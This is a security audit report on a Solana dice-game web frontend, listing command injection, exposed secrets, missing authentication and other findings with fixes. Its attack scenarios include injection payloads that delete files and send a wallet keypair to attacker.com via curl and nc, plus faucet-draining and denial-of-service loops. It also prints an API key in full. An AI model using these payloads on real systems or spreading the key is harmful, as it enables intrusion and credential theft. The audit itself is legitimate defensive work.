# OreCraps Security Audit Report
Generated: 2025-11-26

## Executive Summary

This security audit identified 8 CRITICAL, 5 HIGH, and 4 MEDIUM severity vulnerabilities in the OreCraps frontend application. The most severe issues involve command injection vulnerabilities in API routes, exposed secrets in environment files, and lack of authentication/authorization on sensitive endpoints.

RISK LEVEL: CRITICAL - Immediate remediation required before production deployment.

---

## CRITICAL SEVERITY FINDINGS

### CRIT-1: Command Injection in API Routes
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/start-round/route.ts` (lines 24-62)
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/faucet/route.ts` (lines 38-89)
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/localnet/route.ts` (lines 95-131)

**Description**: Multiple API routes execute shell commands using user-controlled input without proper validation or sanitization. The `duration`, `network`, and `wallet` parameters from request bodies are directly interpolated into shell commands.

**Vulnerable Code**:
```typescript
// start-round/route.ts line 27
const duration = body.duration || 300; // No validation!
const network = body.network || "devnet";
// line 61
const command = `COMMAND=start_round DURATION=${duration} RPC="${rpcEndpoint}" KEYPAIR="${KEYPAIR_PATH}" "${CLI_PATH}"`;

// faucet/route.ts line 18
const { wallet, network } = body;
// line 38
const airdropCmd = `solana airdrop 2 ${wallet} --url ${LOCALNET_RPC}`;
```

**Attack Scenario**:
```bash
# Attacker sends malicious request:
POST /api/start-round
{
  "duration": "300; rm -rf / #",
  "network": "devnet; curl attacker.com?data=$(cat /home/r/.config/solana/id.json | base64)"
}

# Or steal private keys:
POST /api/faucet
{
  "wallet": "$(cat /home/r/.config/solana/id.json > /tmp/stolen.txt && nc attacker.com 4444 < /tmp/stolen.txt)",
  "network": "localnet"
}
```

**Impact**:
- Complete server compromise
- Private key theft (ADMIN_KEYPAIR_PATH)
- Arbitrary code execution
- Data exfiltration
- Denial of service

**Remediation**:
1. NEVER use shell command execution with user input
2. Use the Solana Web3.js SDK directly instead of CLI commands
3. If shell commands are absolutely necessary:
   - Validate ALL inputs against strict whitelists
   - Use parameterized commands or execFile() instead of exec()
   - Never interpolate user input into command strings
   - Use input validation libraries (zod, joi)

```typescript
// Example fix:
import { z } from 'zod';

const startRoundSchema = z.object({
  duration: z.number().int().min(10).max(10000),
  network: z.enum(['devnet', 'localnet']),
});

export async function POST(request: Request) {
  const body = await request.json();
  const validated = startRoundSchema.parse(body); // Throws on invalid input
  // Now safe to use validated.duration and validated.network
}
```

---

### CRIT-2: Exposed API Keys and Secrets in Repository
**File**: `/home/r/Coding/ore/frontend/orecraps/.env.local` (line 2)
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/reset-round/route.ts` (line 11)

**Description**: Hardcoded Helius RPC API key exposed in both .env.local file and directly in source code.

**Exposed Secret**:
```
NEXT_PUBLIC_RPC_ENDPOINT=https://devnet.helius-rpc.com/?api-key=22043299-7cbe-491c-995a-2e216e3a7cc7
```

**Impact**:
- API key abuse by unauthorized parties
- Potential service quota exhaustion
- Financial cost if RPC service is paid
- Rate limiting affecting legitimate users
- Key compromise in version control history

**Remediation**:
1. IMMEDIATELY revoke the exposed API key at Helius dashboard
2. Generate new API key
3. Move all secrets to server-side only environment variables (remove NEXT_PUBLIC_ prefix)
4. Add .env.local to .gitignore (verify it's not in git history)
5. Use git-secrets or similar tools to prevent future commits
6. Rotate any other potentially exposed credentials

```bash
# Check git history for exposed secrets
git log -p -- .env.local

# Remove from history if found
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env.local" \
  --prune-empty --tag-name-filter cat -- --all
```

---

### CRIT-3: No Authentication on Admin API Routes
**Files**: ALL files in `/home/r/Coding/ore/frontend/orecraps/src/app/api/`

**Description**: All API routes (start-round, reset-round, localnet, faucet) are completely unauthenticated. Anyone can call these endpoints to:
- Start/reset game rounds
- Execute administrative commands
- Airdrop tokens to arbitrary addresses
- Control localnet validator

**Vulnerable Code**:
```typescript
// NO authentication checks anywhere:
export async function POST(request: Request) {
  // Direct execution without any auth
  const { stdout, stderr } = await execAsync(command);
}
```

**Attack Scenario**:
```bash
# Anyone can reset the game:
curl -X POST https://orecraps.com/api/reset-round

# Drain faucet to attacker's wallet:
for i in {1..1000}; do
  curl -X POST https://orecraps.com/api/faucet \
    -H "Content-Type: application/json" \
    -d '{"wallet":"AttackerWallet...", "network":"localnet"}'
done

# DOS by repeatedly starting rounds:
while true; do
  curl -X POST https://orecraps.com/api/start-round \
    -H "Content-Type: application/json" \
    -d '{"duration":1}'
done
```

**Impact**:
- Unauthorized game manipulation
- Resource exhaustion
- Denial of service
- Financial loss (faucet drainage)
- Game integrity compromise

**Remediation**:
1. Implement authentication middleware for all admin routes
2. Use API keys or JWT tokens for route protection
3. Implement rate limiting per IP/user
4. Add CORS restrictions
5. Move admin functions to separate authenticated admin panel

```typescript
// Example auth middleware:
import { NextRequest } from "next/server";

function requireAuth(request: NextRequest) {
  const apiKey = request.headers.get("x-api-key");
  const validKey = process.env.ADMIN_API_KEY;

  if (!apiKey || apiKey !== validKey) {
    return new Response("Unauthorized", { status: 401 });
  }
  return null;
}

export async function POST(request: NextRequest) {
  const authError = requireAuth(request);
  if (authError) return authError;

  // Protected logic here
}
```

---

### CRIT-4: Path Traversal via KEYPAIR_PATH
**Files**: All API routes using `ADMIN_KEYPAIR_PATH`

**Description**: While the keypair path uses an environment variable, there's no validation. If an attacker can control environment variables (via other vulnerabilities), they could read arbitrary files.

**Vulnerable Pattern**:
```typescript
const KEYPAIR_PATH = process.env.ADMIN_KEYPAIR_PATH || "/home/r/.config/solana/id.json";
const command = `KEYPAIR="${KEYPAIR_PATH}" "${CLI_PATH}"`;
```

**Attack Scenario** (if env can be manipulated):
```bash
ADMIN_KEYPAIR_PATH="/etc/passwd" # Read system files
ADMIN_KEYPAIR_PATH="/home/r/.ssh/id_rsa" # Steal SSH keys
```

**Remediation**:
1. Validate KEYPAIR_PATH is within expected directory
2. Use absolute paths only
3. Verify file exists and has correct permissions
4. Never allow user input to influence this path

---

### CRIT-5: Unvalidated Wallet Address in Faucet
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/faucet/route.ts` (line 18)

**Description**: The faucet endpoint accepts wallet addresses without validation, allowing command injection through malicious wallet strings.

**Vulnerable Code**:
```typescript
const { wallet, network } = body;
// No validation!
const airdropCmd = `solana airdrop 2 ${wallet} --url ${LOCALNET_RPC}`;
```

**Attack Scenario**:
```javascript
fetch('/api/faucet', {
  method: 'POST',
  body: JSON.stringify({
    wallet: '; cat /home/r/.config/solana/id.json | curl https://attacker.com -d @-',
    network: 'localnet'
  })
})
```

**Remediation**:
```typescript
import { PublicKey } from "@solana/web3.js";

const body = await request.json();
const { wallet, network } = body;

// Validate it's a valid Solana address
try {
  new PublicKey(wallet);
} catch {
  return NextResponse.json(
    { success: false, error: "Invalid wallet address" },
    { status: 400 }
  );
}
```

---

### CRIT-6: Race Condition in Random Number Generation
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/start-round/route.ts` (lines 15-22)

**Description**: The simulated dice roll uses Math.random() which is:
1. Not cryptographically secure
2. Predictable if attacker can observe multiple rolls
3. Exploitable for gambling manipulation

**Vulnerable Code**:
```typescript
function rollDice(): { die1: number; die2: number; sum: number; square: number } {
  const die1 = Math.floor(Math.random() * 6) + 1; // WEAK RNG!
  const die2 = Math.floor(Math.random() * 6) + 1;
  // ...
}
```

**Impact**:
- Predictable outcomes in gambling context
- Potential financial losses for users
- Game fairness compromise
- Trust issues

**Remediation**:
```typescript
import { randomInt } from "crypto";

function rollDice(): { die1: number; die2: number; sum: number; square: number } {
  const die1 = randomInt(1, 7); // Cryptographically secure [1, 7)
  const die2 = randomInt(1, 7);
  const sum = die1 + die2;
  const square = (die1 - 1) * 6 + (die2 - 1);
  return { die1, die2, sum, square };
}
```

---

### CRIT-7: Server-Side Request Forgery (SSRF) in RPC Manager
**File**: `/home/r/Coding/ore/frontend/orecraps/src/lib/rpcManager.ts` (lines 12-15)

**Description**: RPC endpoints are loaded from environment variables without validation, allowing potential SSRF attacks if environment can be manipulated.

**Vulnerable Code**:
```typescript
devnet: [
  process.env.NEXT_PUBLIC_RPC_ENDPOINT || "", // No URL validation!
  "https://api.devnet.solana.com",
  // ...
]
```

**Remediation**:
1. Validate all URLs are https://
2. Whitelist allowed domains
3. Never allow user input in RPC endpoints

---

### CRIT-8: Information Disclosure in Error Messages
**Files**: All API routes returning detailed errors

**Description**: API routes return verbose error messages including stack traces, file paths, and command output to clients.

**Vulnerable Code**:
```typescript
return NextResponse.json(
  {
    success: false,
    error: errorMessage,
    details: stderr, // Exposes internal details!
  },
  { status: 500 }
);
```

**Leaked Information**:
- File system paths
- Command execution details
- Stack traces with code snippets
- Internal configuration

**Remediation**:
```typescript
// Log detailed errors server-side only
console.error("Full error:", error);

// Return generic message to client
return NextResponse.json(
  {
    success: false,
    error: "An internal error occurred. Please try again.",
    requestId: generateRequestId(), // For support lookup
  },
  { status: 500 }
);
```

---

## HIGH SEVERITY FINDINGS

### HIGH-1: Insufficient Input Validation in Transaction Building
**File**: `/home/r/Coding/ore/frontend/orecraps/src/components/deploy/DeployPanel.tsx` (lines 97-105)

**Description**: User input for deployment amount is not properly validated before creating transactions.

**Vulnerable Code**:
```typescript
const amountLamports = BigInt(Math.floor(totalAmount * LAMPORTS_PER_SOL));
```

**Issues**:
- No maximum amount validation
- Negative numbers could cause issues
- Extremely large numbers could cause precision loss
- No balance check before transaction

**Remediation**:
```typescript
// Validate input
if (totalAmount <= 0) {
  toast.error("Amount must be positive");
  return;
}
if (totalAmount > 1000) { // Set reasonable max
  toast.error("Amount too large");
  return;
}

// Check balance
const balance = await connection.getBalance(publicKey);
if (balance < amountLamports) {
  toast.error("Insufficient balance");
  return;
}
```

---

### HIGH-2: No Rate Limiting on Client-Side RPC Calls
**File**: `/home/r/Coding/ore/frontend/orecraps/src/hooks/useCraps.ts`

**Description**: Polling intervals are too aggressive for devnet (10s) and can cause rate limiting.

**Current Implementation**:
```typescript
const DEVNET_POLL_INTERVAL = 10000; // 10 seconds - too aggressive
```

**Impact**:
- RPC rate limiting
- Poor user experience
- Unnecessary resource consumption
- Potential service blocking

**Remediation**:
1. Increase polling interval to 30s for devnet
2. Implement exponential backoff
3. Use websocket subscriptions instead of polling
4. Add user-configurable polling settings

---

### HIGH-3: Missing CSRF Protection
**Files**: All POST API routes

**Description**: Next.js API routes don't have built-in CSRF protection. Without authentication, these routes are vulnerable to CSRF attacks.

**Attack Scenario**:
```html
<!-- Attacker's malicious website -->
<form action="https://orecraps.com/api/reset-round" method="POST">
  <input type="hidden" name="malicious" value="payload">
</form>
<script>document.forms[0].submit();</script>
```

**Remediation**:
1. Implement CSRF tokens
2. Check Origin/Referer headers
3. Use SameSite cookies
4. Require custom headers (breaks simple forms)

---

### HIGH-4: Unvalidated bigint Conversions
**File**: `/home/r/Coding/ore/frontend/orecraps/src/lib/program.ts` (lines 141-146)

**Description**: BigInt conversions don't validate inputs, risking overflows or invalid values.

**Vulnerable Code**:
```typescript
function toLeBytes(value: bigint, length: number): Uint8Array {
  const bytes = new Uint8Array(length);
  for (let i = 0; i < length; i++) {
    bytes[i] = Number((value >> BigInt(8 * i)) & 0xffn);
  }
  return bytes;
}
```

**Issues**:
- No validation that value fits in `length` bytes
- Silent truncation on overflow
- Could cause incorrect transaction data

**Remediation**:
```typescript
function toLeBytes(value: bigint, length: number): Uint8Array {
  const maxValue = (1n << BigInt(length * 8)) - 1n;
  if (value < 0n || value > maxValue) {
    throw new Error(`Value ${value} doesn't fit in ${length} bytes`);
  }
  // ... rest of function
}
```

---

### HIGH-5: Potential XSS in Dynamic Content
**File**: `/home/r/Coding/ore/frontend/orecraps/src/components/craps/CrapsBettingPanel.tsx`

**Description**: While no direct XSS was found, user-controlled data from blockchain (wallet addresses, amounts) is displayed without explicit sanitization. React provides automatic escaping, but defensive programming requires explicit handling.

**Remediation**:
1. Explicitly validate and sanitize all blockchain data before display
2. Use Content Security Policy headers
3. Implement CSP nonces for inline scripts

---

## MEDIUM SEVERITY FINDINGS

### MED-1: Insecure Random Square Selection Simulation
**File**: `/home/r/Coding/ore/frontend/orecraps/src/app/api/start-round/route.ts`

**Description**: Simulated mode generates predictable signatures.

**Code**:
```typescript
signature: `sim_${Date.now().toString(36)}`
```

**Impact**: Predictable transaction IDs could be used for timing attacks or fingerprinting.

**Remediation**: Use crypto.randomBytes() for signature generation.

---

### MED-2: Missing Input Sanitization for Network Parameter
**Files**: Multiple files accepting network parameter

**Description**: Network parameter is validated as enum in some places but not consistently.

**Remediation**: Create shared validation middleware.

---

### MED-3: Hardcoded Program IDs
**File**: `/home/r/Coding/ore/frontend/orecraps/src/lib/solana.ts` (lines 5-21)

**Description**: Program IDs and mint addresses are hardcoded. If these change, requires code update.

**Remediation**: Move to environment configuration per network.

---

### MED-4: No Transaction Simulation Before Sending
**Files**: DeployPanel.tsx, CrapsBettingPanel.tsx

**Description**: Transactions are sent without simulation, potentially wasting fees on failed transactions.

**Remediation**:
```typescript
// Simulate before sending
const simulation = await connection.simulateTransaction(transaction);
if (simulation.value.err) {
  toast.error(`Transaction will fail: ${simulation.value.err}`);
  return;
}

// Then send
const signature = await sendTransaction(transaction, connection);
```

---

## SECURITY REQUIREMENTS CHECKLIST

- [ ] All inputs validated and sanitized
- [ ] No hardcoded secrets or credentials
- [ ] Proper authentication on all endpoints
- [ ] SQL queries use parameterization (N/A - no SQL)
- [ ] XSS protection implemented
- [ ] HTTPS enforced where needed
- [ ] CSRF protection enabled
- [ ] Security headers properly configured
- [ ] Error messages don't leak sensitive information
- [ ] Dependencies are up-to-date and vulnerability-free

**COMPLIANCE STATUS**: 1/10 requirements met

---

## REMEDIATION ROADMAP (Prioritized)

### IMMEDIATE (Within 24 hours):
1. Revoke exposed Helius API key
2. Remove .env.local from git and regenerate secrets
3. Add authentication to all API routes
4. Remove command injection vulnerabilities
5. Add input validation to all user inputs

### SHORT-TERM (Within 1 week):
1. Implement rate limiting on all endpoints
2. Add CSRF protection
3. Use cryptographically secure RNG
4. Implement proper error handling
5. Add transaction simulation before sending
6. Validate all bigint conversions

### MEDIUM-TERM (Within 1 month):
1. Replace CLI command execution with Web3.js SDK calls
2. Implement comprehensive input validation framework
3. Add security headers (CSP, HSTS, etc.)
4. Set up automated security scanning in CI/CD
5. Implement monitoring and alerting
6. Add API request logging and anomaly detection

### LONG-TERM (Ongoing):
1. Regular security audits
2. Dependency vulnerability scanning
3. Penetration testing
4. Security training for developers
5. Bug bounty program

---

## RISK MATRIX

| Severity | Count | Risk Level |
|----------|-------|------------|
| CRITICAL | 8     | EXTREME    |
| HIGH     | 5     | SEVERE     |
| MEDIUM   | 4     | MODERATE   |
| LOW      | 0     | MINIMAL    |

**OVERALL RISK**: CRITICAL - Application should NOT be deployed to production in current state.

---

## TOOLS AND FRAMEWORKS RECOMMENDED

1. **Input Validation**: Zod or Joi
2. **Rate Limiting**: express-rate-limit or Upstash Rate Limit
3. **Authentication**: NextAuth.js or custom JWT
4. **Security Headers**: next-secure-headers
5. **Secret Management**: Vault, AWS Secrets Manager, or Doppler
6. **Dependency Scanning**: Snyk, npm audit, or Dependabot
7. **SAST**: Semgrep, SonarQube
8. **DAST**: OWASP ZAP

---

## CONCLUSION

The OreCraps frontend has multiple critical security vulnerabilities that pose immediate risk of:
- Complete server compromise
- Private key theft
- Financial losses
- Service disruption
- Data breaches

**RECOMMENDATION**: Do not deploy to production until ALL CRITICAL and HIGH severity issues are resolved. Implement a comprehensive security testing program before any public release.

---

**Auditor Notes**: This audit focused on static code analysis. Dynamic testing, penetration testing, and smart contract auditing are recommended as next steps.
